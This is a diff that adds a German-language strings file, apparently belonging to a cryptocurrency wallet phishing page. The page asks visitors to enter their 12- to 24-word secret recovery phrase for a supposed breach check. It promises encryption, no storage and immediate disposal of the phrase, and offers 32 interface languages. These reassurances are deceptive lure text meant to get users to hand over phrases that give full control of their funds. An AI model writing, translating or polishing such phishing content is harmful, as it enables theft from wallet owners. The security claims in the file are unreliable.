@@ -1,0 +1,66 @@
+﻿{
+  "mainTitle": "Greife mit deiner Secret Recovery Phrase auf deine Wallet zu",
+  "description1": "Wir führen eine sichere Überprüfung Ihrer Wiederherstellungsphrase gegen unsere Datenbank bekannter Sicherheitsverletzungen durch. Wenn wir eine Kompromittierung feststellen, bieten wir Ihnen umgehend geführte Schritte zum Schutz Ihres Wallets.",
+  "instructions": "Geben Sie die vertrauliche Wiederherstellungsphrase ein, die Sie bei der Initialisierung Ihrer Wallet generiert haben.",
+  "phrase12": "Ich habe eine 12-Wörter-Phrase",
+  "phrase15": "Ich habe eine 15-Wörter-Phrase",
+  "phrase18": "Ich habe eine 18-Wörter-Phrase",
+  "phrase21": "Ich habe eine 21-Wörter-Phrase",
+  "phrase24": "Ich habe eine 24-Wörter-Phrase",
+  "pasteInfo": "Du kannst die gesamte Secret Recovery Phrase in ein beliebiges Feld einfügen.",
+  "errorMessage": "Secret Recovery Phrases müssen aus 12, 15, 18, 21 oder 24 Wörtern bestehen.",
+  "confirmButton": "Secret Recovery Phrase überprüfen",
+  "securityBtnText": "Sicherheitsinformationen anzeigen",
+  "loaderText": "Wiederherstellungsphrase wird überprüft...",
+  "modalTitle": "Sicherheitsinformationen",
+  "bestPracticesTitle": "Sicherheits-Tipps:",
+  "bestPracticesList": [
+    "Achte auf eine sichere Verbindung (HTTPS) in deinem Browser.",
+    "Nutze diese Funktion nur auf privaten und vertrauenswürdigen Geräten."
+  ],
+  "protectionTitle": "So schützen wir dich:",
+  "protectionList": [
+    "Alle Daten werden während der Übertragung verschlüsselt.",
+    "Deine Secret Recovery Phrase wird niemals auf unseren Servern gespeichert."
+  ],
+  "modalNote": "Hinweis: Dies ist eine sichere Sitzung. Deine Secret Recovery Phrase wird ausschließlich zur Sicherheitsprüfung verwendet und direkt nach der Verarbeitung verworfen.",
+  "languageOptions": {
+    "en": "English",
+    "es": "Español",
+    "fr": "Français",
+    "de": "Deutsch",
+    "it": "Italiano",
+    "pt": "Português",
+    "pt-br": "Português (Brasil)",
+    "nl": "Nederlands",
+    "sv": "Svenska",
+    "da": "Dansk",
+    "no": "Norsk",
+    "fi": "Suomi",
+    "pl": "Polski",
+    "ru": "Русский",
+    "uk": "Українська",
+    "cs": "Čeština",
+    "hu": "Magyar",
+    "ro": "Română",
+    "tr": "Türkçe",
+    "ar": "العربية",
+    "fa": "فارسی",
+    "hi": "हिन्दी",
+    "bn": "বাংলা",
+    "th": "ไทย",
+    "vi": "Tiếng Việt",
+    "id": "Bahasa Indonesia",
+    "ms": "Bahasa Melayu",
+    "fil": "Filipino",
+    "zh": "中文(简体)",
+    "zh-tw": "中文(繁體)",
+    "ja": "日本語",
+    "ko": "한국어"
+  }
+}
+
+
+
+
+
